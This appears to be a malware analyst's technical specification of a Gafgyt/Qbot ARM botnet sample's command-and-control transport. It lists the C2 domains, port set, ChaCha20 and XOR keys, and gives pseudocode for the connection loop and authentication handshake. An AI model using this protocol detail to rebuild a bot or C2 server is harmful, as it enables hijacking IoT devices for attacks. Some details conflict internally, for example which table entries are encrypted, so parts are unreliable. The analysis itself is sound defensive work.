# Transport Layer Technical Specification
## Gafgyt/Qbot Botnet — Sample "marvisxoxo" (ARM 32-bit ELF)

---

## 1. C2 Infrastructure Retrieval

### 1.1. Observed Behavior

The binary does **not** contain hardcoded IP addresses. Instead, C2 server addresses are stored as **ChaCha20-encrypted domain names** within an encoded string table. The binary initializes this table at startup (`xor_init` → `xor_add`), then resolves the domains via a **custom DNS resolver** at runtime.

The resolution follows a three-tier fallback chain:

1. **Primary:** `marvisxoxo.st` — string table index 0
2. **Fallback 1:** `valid.marvisxoxo.st` — string table index 1
3. **Fallback 2:** `tls.marvisxoxo.st` — string table index 2

If DNS resolution fails for a domain (returns NULL or an empty result), the binary immediately proceeds to the next domain in the chain. If all three domains fail to resolve, the binary calls `exit(1)` and terminates.

The **C2 port** is selected **randomly** from a hardcoded set of 11 port candidates stored at address `0x0001fb34`. One port is chosen per connection attempt via `rand_next() % 11`.

### 1.2. Recovered C2 Addresses & Ports

| Tier | Domain | String Table Index |
|------|--------|-------------------|
| Primary | `marvisxoxo.st` | 0 |
| Fallback 1 | `valid.marvisxoxo.st` | 1 |
| Fallback 2 | `tls.marvisxoxo.st` | 2 |

**Port candidates** (stored as little-endian `uint16` at `0x0001fb34`, 22 bytes = 11 ports):

| Index | LE Bytes | Port Value (Network Byte Order) |
|-------|----------|----------------------------------|
| 0 | `4d a4` | 19876 |
| 1 | `ed 5c` | 60764 |
| 2 | `6b d3` | 27603 |
| 3 | `6c 80` | 27776 |
| 4 | `73 3e` | 29502 |
| 5 | `04 b7` | 1207 |
| 6 | `67 f0` | 26608 |
| 7 | `1d 96` | 7574 |
| 8 | `03 6c` | 876 |
| 9 | `e0 c0` | 57536 |
| 10 | `19 1c` | 7193 |

**C2 Password:**
- Taken from `argv[1]` (first command-line argument), maximum 31 characters.
- **Default password** (when no argument provided): `"h"` (single byte `0x68`).
- The password is zeroed from `argv[1]` immediately after copying.

### 1.3. Retrieval Logic (Pseudocode)

```
FUNCTION GetC2Address():
    // Step 1: Initialize string table (done once at startup)
    table = calloc(157, 12)          // 157 entries, 12 bytes each
    FOR i = 0 TO 156:
        encrypted_data_ptr = pointer_table[i]
        length = length_table[i]
        table[i].ptr = strdup(encrypted_data_ptr)
        table[i].len = length
        // Decrypt in-place using ChaCha20
        ChaCha20_decrypt(
            key =     [0x5a,0x3f,0x2e,0x7b, 0x8c,0x9d,0x0a,0x6e,
                       0x3b,0x4f,0x7c,0x8a, 0x1d,0x5c,0x2b,0x0d,
                       0x6f,0x1a,0x0c,0x3e, 0x2d,0x8e,0x4a,0x09,
                       0x1c,0x7e,0x5a,0x4d, 0x3c,0x2b,0x6a,0x08],
            nonce =   [0x4a,0x1b,0x00,0xff, 0x2d,0x7c,0x3a,0x12, 0x00,0x01,0x03,0x05],
            counter = 1,
            data =    table[i].ptr,
            length =  table[i].len
        )
        table[i].ptr[table[i].len] = '\0'  // Null-terminate
    NEXT i

    // Step 2: Resolve C2 domain (tiered fallback)
    FOR domain_ptr IN [table[0].ptr, table[1].ptr, table[2].ptr]:
        resolved = DNS_Resolve(domain_ptr)
        IF resolved != NULL AND resolved[0] != '\0':
            ip = TransformIP(resolved->addresses[0])
            RETURN ip
        END IF
        IF resolved != NULL:
            FreeResolvedEntries(resolved)
        END IF
    NEXT domain_ptr

    exit(1)  // All domains failed
END FUNCTION

FUNCTION GetC2Port():
    port_data = READ_BYTES(0x0001fb34, 22)  // 11 x uint16 LE
    port_array = CAST(port_data AS uint16[11])
    random_index = rand_next() % 11
    port_be = byteswap(port_array[random_index])  // LE → BE (network order)
    RETURN port_be
END FUNCTION
```

### 1.4. DNS Resolution Logic

The binary implements a **custom DNS resolver** (`resolv_lookup` at `0x0000f088`) that performs raw DNS queries over UDP.

**DNS Server Selection** (`rand_dns` at `0x0000ef90`):
- Uses `srand(time(NULL) ^ getpid())` to seed on first call.
- Randomly selects from 5 hardcoded DNS server IPs:

| Case | IP Address | Hex Value |
|------|-----------|-----------|
| 0 (default) | `8.8.8.8` | `0x08080808` |
| 1 | `1.1.1.1` | `0x01010101` |
| 2 | `8.8.4.4` | `0x08080404` |
| 3 | `9.9.9.9` | `0x09090909` |
| 4 | `1.0.0.1` | `0x01000001` |

**DNS Query Construction:**
1. Encode the domain name into DNS label format (dot-separated labels prefixed with length bytes).
2. Generate a random 16-bit query ID (`rand_next() & 0xFFFF`).
3. Construct a DNS query packet:
   - 2 bytes: query ID (random)
   - 2 bytes: flags (`0x0100` = standard query, recursion desired)
   - 2 bytes: QDCOUNT = 1
   - 2 bytes: ANCOUNT = 0
   - 2 bytes: NSCOUNT = 0
   - 2 bytes: ARCOUNT = 0
   - Encoded domain name
   - 2 bytes: QTYPE = `0x0001` (A record)
   - 2 bytes: QCLASS = `0x0001` (IN class)
4. Send to randomly selected DNS server on port 53 (`0x0035`).

**DNS Response Parsing:**
- Socket timeout: 5 seconds (`select()` with `tv_sec = 5`).
- Up to 5 retry attempts with different DNS servers.
- Parses the DNS response to extract A record (type 4 = IPv4) addresses.
- Returns a structure containing: `{ count: uint8, addresses: uint32[] }`.

**IP Transformation** (`resolv_transform_ip` at `0x0000ef3c`):
```
FUNCTION TransformIP(raw_ip):
    RETURN ((raw_ip & 0xFF0000) >> 8 | (raw_ip >> 24) << 16) >> 8 |
           (raw_ip & 0xFF) << 16 |
           (((raw_ip & 0xFF00) << 8) >> 16) << 24
END FUNCTION
```
This function converts from DNS response byte order to network byte order for the `sockaddr_in` structure.

---

## 2. Transport Initialization

### 2.1. Observed Behavior

The binary establishes a **single persistent TCP connection** to the C2 server using a non-blocking `connect()` within a `select()`-driven event loop. The connection lifecycle includes heartbeat pings, authentication, and reconnection with jittered backoff.

### 2.2. Network Parameters

| Parameter | Value |
|-----------|-------|
| **Protocol** | TCP (IPv4) |
| **Socket Type** | `SOCK_STREAM` (1) |
| **Address Family** | `AF_INET` (2) |
| **Socket Mode** | Non-blocking (`O_NONBLOCK` via `fcntl(fd, F_SETFL, flags \| 0x800)`) |
| **select() timeout** | 15 seconds (`tv_sec = 15, tv_usec = 0`) |
| **Heartbeat interval** | 60 seconds (every 6th select timeout) |
| **Heartbeat payload** | 2 bytes: `\x00\x00` sent via `send(fd, buf, 2, MSG_NOSIGNAL)` |
| **Data XOR key** | `0xed` — all C2 network data is XOR'd byte-by-byte with this key |
| **Recv flags** | `MSG_NOSIGNAL` (0x4000) |
| **Recv buffer size** | 1024 bytes (0x400) |

### 2.3. Connection Logic (Pseudocode)

```
GLOBAL:
    fd_serv      = -1          // C2 server socket
    fd_ctrl      = <listen_fd> // Single-instance control socket (port 1234)
    pending_conn = 0           // Connection state flag (0=connecting, 1=connected)

FUNCTION MainLoop():
    WHILE TRUE:
        FD_ZERO(read_set)
        FD_ZERO(write_set)

        // Add control socket to read set
        IF fd_ctrl != -1:
            FD_SET(fd_ctrl, read_set)
        END IF

        // If no server connection exists, initiate one
        IF fd_serv == -1:
            fd_serv = socket(AF_INET, SOCK_STREAM, 0)
            IF fd_serv == -1:
                CONTINUE
            END IF
            // Set non-blocking
            flags = fcntl(fd_serv, F_GETFL, 0)
            fcntl(fd_serv, F_SETFL, flags | O_NONBLOCK)

            // Build server address
            srv_addr.sin_family = AF_INET
            srv_addr.sin_port = GetC2Port()       // Random port from 11 candidates
            srv_addr.sin_addr = GetC2Address()     // Resolved C2 IP

            pending_conn = 1
            connect(fd_serv, &srv_addr, 16)        // Non-blocking connect
        END IF

        // Add server socket to appropriate fd_set
        IF pending_conn == 0:    // Already connected
            FD_SET(fd_serv, read_set)
        ELSE:                    // Still connecting
            FD_SET(fd_serv, write_set)
        END IF

        max_fd = MAX(fd_ctrl, fd_serv) + 1
        timeout.tv_sec = 15
        timeout.tv_usec = 0

        result = select(max_fd, &read_set, &write_set, NULL, &timeout)

        IF result == -1:
            CONTINUE
        END IF

        // --- TIMEOUT (heartbeat) ---
        IF result == 0:
            heartbeat_counter = (heartbeat_counter + 1) % 6
            IF heartbeat_counter == 0:
                send(fd_serv, [0x00, 0x00], 2, MSG_NOSIGNAL)
            END IF
        END IF

        // --- CONTROL SOCKET ACTIVITY ---
        IF fd_ctrl in read_set:
            // Another instance tried to bind — kill entire process group
            accept(fd_ctrl, ...)
            kill(-session_id, SIGKILL)
            exit(0)
        END IF

        // --- SERVER SOCKET: CONNECTING ---
        IF pending_conn == 1:
            IF fd_serv in write_set:
                err = 0
                len = sizeof(err)
                getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &err, &len)
                IF err == 0:
                    // Connection successful
                    pending_conn = 0
                    SendAuthentication(fd_serv, password)
                ELSE:
                    // Connection failed
                    close(fd_serv)
                    fd_serv = -1
                    sleep(rand_next() % 10 + 1)  // Jittered backoff 1-10s
                END IF
            END IF
        END IF

        // --- SERVER SOCKET: RECEIVE DATA ---
        IF pending_conn == 0 AND fd_serv in read_set:
            errno = 0
            bytes = recv(fd_serv, buffer, 1024, MSG_NOSIGNAL)
            IF bytes <= 0:
                IF errno != EAGAIN AND errno != EWOULDBLOCK:
                    close(fd_serv)
                    fd_serv = -1
                    sleep(1)
                END IF
            ELSE:
                // XOR decrypt received data
                XOR(buffer, bytes, 0xED)

                // Check if this is an auth challenge (first 18 bytes)
                challenge = [0x0a, 0x01, 0x02, 0x03, 0x04, 0x04, 0x03, 0x02,
                             0x01, 0x03, 0x02, 0x0e, 0x0a, 0x0d, 0x0e, 0x03,
                             0x02, 0x00]
                IF memcmp(buffer, challenge, 18) == 0:
                    // Auth challenge — send authentication
                    SendAuthentication(fd_serv, password)
                ELSE:
                    // Attack command — parse and execute
                    ParseAttackCommand(buffer, bytes)
                END IF
                memset(buffer, 0, 1024)
            END IF
        END IF
    END WHILE
END FUNCTION
```

### 2.4. Authentication Handshake

The authentication packet is constructed as follows:

```
FUNCTION SendAuthentication(socket_fd, password):
    cpu_count = CountCPUs()  // Count "processor" lines in /proc/cpuinfo
                             // Fallback: sysconf(_SC_NPROCESSORS_ONLN)
                             // Minimum: 1

    header = [0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x00,
              0x03, 0x02, 0x01, 0x02, 0x03, 0x04, 0x05,
              0x05, 0x04, 0x03, 0x02, 0x01]  // 19 bytes

    password_len = strlen(password)

    // Build payload: password (XOR'd) + CPU count
    payload = password[0..password_len]      // Plaintext password bytes
    XOR(payload, password_len, 0xED)         // XOR encrypt with 0xED
    payload.append(cpu_count)                // Append CPU count (1 byte)

    // Calculate checksum over payload
    checksum = IPChecksum(payload, (password_len + 1) / 2)  // 16-bit ones' complement
    payload.append(checksum as uint16 LE)    // Append 2-byte checksum

    // Send: header (19) + payload_len (1) + payload (N+1) + checksum (2)
    // Total: 19 + 1 + N + 1 + 2 = N + 23 bytes
    packet = header
    packet.append(password_len)              // 1 byte
    packet.append(payload)                   // N+1+2 bytes
    send(socket_fd, packet, len(packet), MSG_NOSIGNAL)
END FUNCTION
```

**Authentication Packet Structure:**

| Offset | Size | Field | Description |
|--------|------|-------|-------------|
| 0 | 19 | Header | Fixed byte sequence (see above) |
| 19 | 1 | Password Length | `uint8` length of password |
| 20 | N | Password | Password bytes, XOR'd with `0xED` |
| 20+N | 1 | CPU Count | Number of CPU cores (`uint8`, min 1) |
| 21+N | 2 | Checksum | IP-style ones' complement checksum over password+CPU count |

**Checksum Algorithm** (`checksum_generic` at `0x0000be70`):
```
FUNCTION IPChecksum(data, word_count):
    sum = 0
    FOR i = 0 TO word_count - 1:
        sum += data[i*2] | (data[i*2+1] << 8)  // Treat as uint16 LE
    END FOR
    IF odd byte remaining:
        sum += data[last_byte]
    END IF
    sum = (sum & 0xFFFF) + (sum >> 16)
    RETURN (~(sum + (sum >> 16))) & 0xFFFF
END FUNCTION
```

### 2.5. Reconnection Strategy

| Scenario | Behavior |
|----------|----------|
| **Initial connection failure** | Close socket, set `fd_serv = -1`, sleep `rand_next() % 10 + 1` seconds (1–10s jitter), retry immediately on next loop iteration |
| **Connection timeout (select returns 0 while pending_conn=1)** | Handled by `getsockopt(SO_ERROR)` check on next writable event |
| **Connection reset / recv returns ≤0** | Close socket, set `fd_serv = -1`, sleep 1 second, reconnect on next loop iteration |
| **All DNS resolutions fail** | `exit(1)` — no retry, process terminates |
| **No maximum retry limit** | The main loop runs indefinitely, reconnecting on each iteration when `fd_serv == -1` |

---

## 3. String Table Analysis

### 3.1. Observed Behavior

The string table is initialized once at startup via `xor_init()` (address `0x0000b204`). It allocates an array of **157 entries** (`calloc(0x9d, 0xc)`), where each entry occupies 12 bytes:

```
struct StringTableEntry {
    char *data;      // offset 0 (4 bytes) — pointer to decrypted string
    int   length;    // offset 4 (4 bytes) — length of string in bytes
    // offset 8: padding/unused (4 bytes)
};
```

The table base pointer is stored at global address `0x0002934c`.

The `xor_add()` function (address `0x0000b16c`) populates the table by:
1. Reading a pointer to encrypted data from a hardcoded pointer table (at `0x0000bc08`).
2. `strdup()`-ing the encrypted data.
3. Decrypting it **in-place** using ChaCha20.
4. Null-terminating the result.

### 3.2. Decryption Routine

**Cipher:** ChaCha20 (20-round variant)

**Parameters:**

| Parameter | Value | Location |
|-----------|-------|----------|
| **Key** (32 bytes) | `5a 3f 2e 7b 8c 9d 0a 6e 3b 4f 7c 8a 1d 5c 2b 0d 6f 1a 0c 3e 2d 8e 4a 09 1c 7e 5a 4d 3c 2b 6a 08` | `0x000290fc` |
| **Nonce** (12 bytes) | `4a 1b 00 ff 2d 7c 3a 12 00 01 03 05` | `0x0002911c` |
| **Initial counter** | `1` | Hardcoded in `xor_add` |
| **Constants** | `"expand 32-byte k"` (`0x61707865, 0x3320646e, 0x79622d32, 0x6b206574`) | `0x0000b15c` |

```
FUNCTION ChaCha20DecryptString(encrypted_data, length):
    state = [
        0x61707865, 0x3320646e, 0x79622d32, 0x6b206574,  // "expand 32-byte k"
        key[0:4],   key[4:8],   key[8:12],  key[12:16],    // Key words 0-3
        key[16:20], key[20:24], key[24:28], key[28:32],    // Key words 4-7
        1,                                                   // Counter (initial = 1)
        nonce[0:4], nonce[8:12], nonce[4:8]                 // Nonce words
    ]
    // Note: nonce word order is [0][2][1] in ChaCha20 state layout

    counter = 1
    output = bytearray()

    FOR offset = 0 TO length STEP 64:
        keystream = ChaCha20Block(state with counter)
        FOR i = 0 TO MIN(63, length - offset):
            output.append(encrypted_data[offset + i] XOR keystream[i])
        END FOR
        counter += 1
    END FOR

    RETURN output
END FUNCTION
```

**Encrypted String Pointer Table:**
The pointer table is located at address `0x0000bc08` in the `.rodata` section. It contains 157 entries, each a 4-byte pointer to the encrypted data in the `.rodata` section (range `0x0001f2a4` – `0x0002494c`).

### 3.3. Recovered Strings

Below are the decrypted contents of the first 7 string table entries (the only ones encrypted with ChaCha20). Strings beyond index 7 are stored in plaintext and are used for system operations (file paths, process names, format strings, etc.).

| Index | Length | Decrypted Value | Purpose |
|-------|--------|-----------------|---------|
| **0** | 14 | `marvisxoxo.st` | **Primary C2 domain** |
| **1** | 20 | `valid.marvisxoxo.st` | **Fallback C2 domain 1** |
| **2** | 18 | `tls.marvisxoxo.st` | **Fallback C2 domain 2** |
| 3 | 6 | `.ffdfd` | Unknown / auxiliary |
| 4 | 9 | `dvrLocker` | Unknown / internal tag |
| 5 | 9 | `dvrInside` | Unknown / internal tag |
| 6 | 6 | `.ffhhd` | Unknown / auxiliary |

**Plaintext strings (indices 7+, selected examples):**

| Approx. Index | String | Purpose |
|---------------|--------|---------|
| — | `/proc/` | Access check / filesystem ops |
| — | `/proc/%d/cmdline` | Process enumeration |
| — | `/proc/%s/status` | Process status check |
| — | `/proc/cpuinfo` | CPU count detection |
| — | `/dev/watchdog` | Watchdog disable |
| — | `/dev/misc/watchdog` | Watchdog disable (alt path) |
| — | `telnetd\|udhcpc\|...\|dhclient` | Process name candidates (pipe-separated) |
| — | `systemd` | `prctl(PR_SET_NAME, ...)` target name |
| — | `h` | Default C2 password |
| — | `-sh` / `/bin/sh` | Shell invocation |
| — | `r` | File open mode |

**Note:** The majority of the 157 table entries are system utility strings (error messages from `strerror_r`, format specifiers, character class tables, path strings) that are not directly related to C2 transport. The first 3 entries are the critical C2 infrastructure strings.

---

## 4. Analysis Gaps

| Gap | Reason | Impact |
|-----|--------|--------|
| **C2 IP addresses at runtime** | C2 addresses are domain names resolved via DNS at runtime. The resolved IPs depend on live DNS infrastructure that was unavailable during analysis. | The specification documents the domain names and resolution mechanism; actual IPs require live observation. |
| **Full string table (indices 7–156)** | Strings beyond index 7 are stored in plaintext and are primarily system-level utility strings (error messages, format strings, character class tables from the C library). | No impact on C2 transport analysis; these strings are unrelated to C2 infrastructure or network initialization. |
| **Attack command format details** | The attack command parsing was not fully analyzed as it is outside the transport layer scope. | No impact — the transport layer handles authentication and data delivery; command semantics are a separate concern. |
| **DNS server reachability** | The custom DNS resolver uses hardcoded public DNS servers (8.8.8.8, 8.8.4.4, 9.9.9.9, 1.1.1.1, 1.0.0.1). If these are blocked or unreachable, resolution will fail. | The binary will fall through all 3 C2 domains and exit(1) if DNS is unavailable. |
